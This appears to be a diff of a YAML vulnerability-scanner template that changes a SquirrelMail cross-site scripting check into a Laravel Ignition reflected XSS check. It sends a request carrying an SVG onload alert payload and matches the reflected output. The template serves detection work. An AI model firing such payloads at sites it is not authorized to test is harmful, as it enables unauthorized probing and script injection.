@@ -1,31 +1,30 @@
-id: squirrelmail-address-xss
+id: laravel-ignition-xss
 
 info:
-  name: SquirrelMail 1.4.2 Address Add Plugin - 'add.php' Cross-Site Scripting
-  author: dhiyaneshDk
+  name: Laravel Ignition XSS
+  author: 0x_Akoko
   severity: medium
-  description: SquirrelMail Address Add Plugin is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
-  reference: https://www.exploit-db.com/exploits/26305
-  tags: xss,squirrelmail,plugin
+  tags: laravel,xss,ignition
+  reference:
+    - https://github.com/facade/ignition/issues/273
+    - https://www.acunetix.com/vulnerabilities/web/laravel-ignition-reflected-cross-site-scripting/
 
 requests:
   - method: GET
     path:
-      - '{{BaseURL}}/_ignition/scripts/--><svg%20onload=alert('{{randstr}}')>'
+      - "{{BaseURL}}/_ignition/scripts/--><svg%20onload=alert(1337)>"
 
     matchers-condition: and
     matchers:
       - type: word
-        part: body
         words:
-          - '<svg onload=alert({{randstr}})'
-        condition: and
+          - "<svg onload=alert(1337)>"
+        part: body
 
       - type: status
         status:
-          - 200
-
+          - 500
       - type: word
-        part: header
         words:
           - "text/html"
+        part: header
